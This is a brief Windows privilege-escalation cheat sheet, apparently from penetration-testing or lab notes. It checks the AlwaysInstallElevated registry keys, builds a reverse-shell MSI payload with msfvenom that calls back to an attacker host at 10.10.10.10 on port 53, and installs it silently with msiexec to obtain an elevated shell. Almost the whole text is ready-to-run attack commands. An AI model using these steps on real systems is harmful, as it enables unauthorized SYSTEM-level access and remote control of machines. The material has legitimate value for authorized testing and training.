
1. **Query AlwaysInstallElevated Keys:**
   ```plaintext
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```
   - Checks if both keys are set to 1 (0x1).

2. **Generate Reverse Shell MSI:**
   ```plaintext
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
   ```

3. **Transfer and Execute MSI:**
   - Place `reverse.msi` in `C:\PrivEsc`.
   - Start a listener on Kali.
   - Execute the MSI to trigger a reverse shell:
     ```plaintext
     msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
     ```
